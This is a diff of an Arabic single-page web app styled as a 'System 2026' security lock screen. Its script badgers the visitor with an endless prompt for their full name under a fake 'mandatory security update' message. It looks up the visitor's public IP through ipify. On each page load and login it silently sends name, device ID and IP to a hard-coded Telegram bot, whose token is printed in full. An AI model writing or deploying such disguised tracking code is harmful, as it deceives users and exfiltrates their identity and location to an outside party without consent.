@@ -2,169 +2,102 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
+<!-- أكواد منع التخزين (عشان يجبره يسحب الجديد) -->
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System 2026 [V70 Pro]</title>
+<title>System Update [V61]</title>
 <style>
-    /* تنسيقات التصميم العام */
-    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#0d1117;color:#c9d1d9;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;user-select:none;-webkit-user-select:none}
-    
-    /* شاشة القفل */
-    #lock-screen{background:#161b22;border:1px solid #30363d;padding:30px;border-radius:12px;text-align:center;width:85%;max-width:320px;box-shadow:0 10px 30px rgba(0,0,0,0.5)}
-    
-    /* الحقول والأزرار */
-    input{background:#0d1117;border:1px solid #30363d;color:#58a6ff;padding:12px;width:100%;text-align:center;font-size:20px;border-radius:6px;margin:15px 0;outline:none;letter-spacing:1px}
-    button.main-btn{background:#238636;color:#fff;border:none;padding:12px 0;width:100%;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;margin-top:10px;transition:0.2s}
-    button.main-btn:active{transform:scale(0.98)}
-    
-    /* معلومات المستخدم */
-    .info-box {background:#0d1117; padding:10px; border-radius:8px; border:1px dashed #30363d; margin: 15px 0; text-align:center;}
-    
-    /* القائمة الداخلية */
-    #app-menu{display:none;width:100%;height:100vh;padding:20px;box-sizing:border-box;overflow-y:auto}
-    .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;padding-bottom:20px}
-    .app-btn{background:#21262d;border:1px solid #30363d;border-radius:10px;padding:15px;color:#c9d1d9;display:flex;flex-direction:column;align-items:center;justify-content:center;height:110px;text-decoration:none}
-    
-    /* حالة الاتصال */
-    .status-log {font-size: 10px; color: #8b949e; margin-top: 10px; font-family: monospace;}
+    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#0d1117;color:#c9d1d9;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;user-select:none;}
+    #lock-screen{background:#161b22;padding:30px;border-radius:12px;text-align:center;width:90%;max-width:350px;border:1px solid #30363d;}
+    input{background:#0d1117;border:1px solid #30363d;color:#58a6ff;padding:12px;width:100%;text-align:center;font-size:18px;border-radius:6px;margin:15px 0;}
+    button{background:#238636;color:#fff;border:none;padding:12px;width:100%;font-size:16px;border-radius:6px;cursor:pointer;margin-top:5px;}
+    .status-log {font-size: 11px; color: #8b949e; margin-top: 15px; font-family: monospace;}
+    .ver-badge {background: #da3633; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; vertical-align: middle;}
 </style>
 </head>
-<body oncontextmenu="return false">
+<body>
 
-<!-- واجهة القفل -->
 <div id="lock-screen">
-    <div style="font-size:40px;margin-bottom:10px;">🛡️</div>
-    <h2 style="margin:0;color:#fff;font-size:18px;">نظام 2026 (V70)</h2>
-    <p style="font-size:11px;color:#8b949e;">Security & Identity System</p>
+    <!-- ضفتلك العلامة دي عشان تتأكد بعينك إن التحديث وصل -->
+    <h2 style="color:#fff;margin:0 0 10px 0;">نظام 2026 <span class="ver-badge">V61</span></h2>
+    <p style="color:#8b949e;font-size:12px;">تم التحديث أمنياً</p>
     
-    <div class="info-box">
-        <p style="margin:0;font-size:10px;color:#8b949e">User Registered:</p>
-        <p id="dispName" style="margin:5px 0;color:#238636;font-weight:bold;font-size:15px">...</p>
-        <p id="dispID" style="margin:0;font-size:10px;color:#58a6ff;font-family:monospace">...</p>
+    <div style="background:#21262d; padding:10px; border-radius:6px; margin: 15px 0;">
+        <p id="dispName" style="color:#238636;margin:0;font-weight:bold;">...</p>
+        <p id="dispID" style="color:#58a6ff;margin:5px 0 0 0;font-size:10px;">ID LOADING...</p>
     </div>
 
-    <input type="tel" id="pIn" placeholder="أدخل كود المرور">
+    <input type="tel" id="pIn" placeholder="كود المرور">
+    <button onclick="login()">دخول</button>
     
-    <button class="main-btn" onclick="checkPass()">تسجيل الدخول</button>
-    
-    <div id="statusLog" class="status-log">Initializing...</div>
-</div>
-
-<!-- القائمة الرئيسية -->
-<div id="app-menu">
-    <h2 style="color:#fff;border-bottom:1px solid #30363d;padding-bottom:15px;margin-top:0">الرئيسية</h2>
-    <div class="grid">
-        <div class="app-btn" onclick="alert('صفحة النبطشية')">📅 النبطشية</div>
-        <div class="app-btn" onclick="alert('صفحة الورديات')">🌙 الورديات</div>
-        <div class="app-btn" onclick="alert('صفحة التصفيات')">⚖️ التصفيات</div>
-        <div class="app-btn" onclick="alert('صفحة اللمات')">📝 اللمات</div>
-        <div class="app-btn" onclick="alert('صفحة التدفق')">🌊 التدفق</div>
-        <div class="app-btn" onclick="alert('صفحة المواسير')">🏗️ المواسير</div>
-    </div>
-    <button class="main-btn" style="background:#da3633" onclick="logout()">تسجيل خروج 🚪</button>
+    <div id="statusLog" class="status-log">Connecting...</div>
 </div>
 
 <script>
     // ==========================================
-    // 1. الإعدادات الحيوية (Telegram Config)
+    // 1. كود الإجبار (Force Reload V61)
+    // ==========================================
+    const CURRENT_VERSION = "61"; 
+    
+    // لو النسخة المتسجلة قديمة، امسح كل حاجة واعمل ريفرش للصفحة
+    if (localStorage.getItem("app_ver") !== CURRENT_VERSION) {
+        localStorage.clear(); 
+        localStorage.setItem("app_ver", CURRENT_VERSION);
+        // هذا السطر يجبر المتصفح يعيد التحميل من السيرفر مش من الذاكرة
+        window.location.reload(true);
+    }
+
+    // ==========================================
+    // 2. إعدادات التليجرام والهوية
     // ==========================================
     const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
     const CHAT_ID = "-1003886528114";
-    const PASS_CODE = "2026"; // كلمة المرور
-
-    // ==========================================
-    // 2. إدارة الهوية (Identity Management)
-    // ==========================================
-    let userName = localStorage.getItem("sys_v70_name");
-    let userID = localStorage.getItem("sys_v70_id");
-    let userIP = "Waiting...";
-
-    // توليد ID للجهاز مرة واحدة للأبد
-    if (!userID) {
-        userID = "DEV-" + Math.floor(Math.random() * 9000000 + 1000000);
-        localStorage.setItem("sys_v70_id", userID);
-    }
-    document.getElementById("dispID").innerText = userID;
-
-    // ==========================================
-    // 3. المحرك الذكي (Auto Run & Force Loop)
-    // ==========================================
     
-    // هذه الدالة تعمل فور تشغيل الصفحة
-    (async function systemStart() {
-        document.getElementById("statusLog").innerText = "Connecting to Network...";
+    let uID = localStorage.getItem("uid_v61");
+    if(!uID) { uID = "ID-" + Math.floor(Math.random()*900000); localStorage.setItem("uid_v61", uID); }
+    document.getElementById("dispID").innerText = uID;
 
-        // أولاً: جلب الـ IP (محاولة أولى)
+    let uName = localStorage.getItem("uname_v61");
+    let uIP = "Detecting...";
+
+    (async function init() {
+        // جلب IP
         try {
-            const req = await fetch('https://api.ipify.org?format=json');
-            const res = await req.json();
-            userIP = res.ip;
-        } catch (e) {
-            userIP = "Unknown/Hidden";
-        }
+            let req = await fetch('https://api.ipify.org?format=json');
+            let res = await req.json();
+            uIP = res.ip;
+        } catch(e) { uIP = "Unknown IP"; }
 
-        // ثانياً: إجبار المستخدم على تسجيل الاسم
-        if (!userName || userName.length < 3) {
-            // حلقة تكرارية لا تنتهي إلا بالكتابة
-            while (!userName || userName.trim().length < 3) {
-                userName = prompt("⛔ إجراء أمني إجباري (V70):\n\nلتفعيل النسخة، يجب تسجيل اسم المستخدم الحقيقي (ثلاثي).\n\nلن يفتح البرنامج إلا بعد كتابة الاسم:");
+        // طلب الاسم
+        if(!uName) {
+            while(!uName || uName.length < 3) {
+                uName = prompt("تحديث أمني إجباري V61:\nمن فضلك أعد تسجيل اسمك الثلاثي:");
             }
-            // حفظ الاسم
-            localStorage.setItem("sys_v70_name", userName);
-            
-            // 🔥 إرسال البيانات فوراً للتليجرام (تسجيل جديد)
-            sendToTelegram("🆕 NEW INSTALLATION", `Name: ${userName}\nID: ${userID}\nIP: ${userIP}`);
+            localStorage.setItem("uname_v61", uName);
+            sendTele("🆕 NEW UPDATE V61", `Name: ${uName}\nID: ${uID}\nIP: ${uIP}`);
         } else {
-            // المستخدم موجود من قبل، نرسل تنبيه فتح التطبيق
-            sendToTelegram("📱 APP OPENED", `User: ${userName}\nIP: ${userIP}`);
+            sendTele("♻️ APP OPENED (V61)", `User: ${uName}\nIP: ${uIP}`);
         }
-
-        // تحديث الواجهة
-        document.getElementById("dispName").innerText = userName;
-        document.getElementById("statusLog").innerText = "System Secure & Ready.";
+        document.getElementById("dispName").innerText = uName;
+        document.getElementById("statusLog").innerText = "System V61 Active";
     })();
 
-    // ==========================================
-    // 4. وظيفة الإرسال للتليجرام (Telegram Sender)
-    // ==========================================
-    function sendToTelegram(title, details) {
-        const txt = `🛡️ <b>SYSTEM V70 REPORT</b>\n` +
-                    `--------------------------------\n` +
-                    `📌 <b>${title}</b>\n` +
-                    `👤 <b>Name:</b> ${userName}\n` +
-                    `🆔 <b>ID:</b> <code>${userID}</code>\n` +
-                    `🌍 <b>IP:</b> <code>${userIP}</code>\n` +
-                    `🕒 <b>Time:</b> ${new Date().toLocaleTimeString('ar-EG')}`;
-        
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=HTML`;
-
-        // إرسال في الخلفية (لا ينتظر الرد لعدم تعطيل التطبيق)
-        fetch(url).catch(err => console.log("Offline mode"));
+    function sendTele(act, det) {
+        const msg = `🚀 <b>SYSTEM 61</b>\n👤 ${uName}\n🆔 ${uID}\n📍 ${uIP}\n🔔 ${act}\n📝 ${det}`;
+        // استخدام الطريقة المزدوجة لضمان الوصول
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`).catch(e=>console.log(e));
     }
 
-    // ==========================================
-    // 5. تسجيل الدخول (Login Logic)
-    // ==========================================
-    function checkPass() {
-        const inp = document.getElementById("pIn").value;
-        if(inp === PASS_CODE) {
-            sendToTelegram("✅ SUCCESS LOGIN", "Access Granted");
-            document.getElementById("lock-screen").style.display = "none";
-            document.getElementById("app-menu").style.display = "block";
+    window.login = function() {
+        if(document.getElementById("pIn").value === "2026") {
+            sendTele("LOGIN SUCCESS", "User Entered");
+            alert("تم الدخول (V61)");
         } else {
-            sendToTelegram("⛔ FAILED LOGIN", `Wrong Code: ${inp}`);
-            alert("كود خاطئ!");
-            document.getElementById("pIn").value = "";
+            alert("الكود خطأ");
         }
-    }
-
-    // ==========================================
-    // 6. الخروج
-    // ==========================================
-    function logout() {
-        if(confirm("خروج؟")) {
-            location.reload();
-        }
-    }
+    };
 </script>
 </body>
 </html>
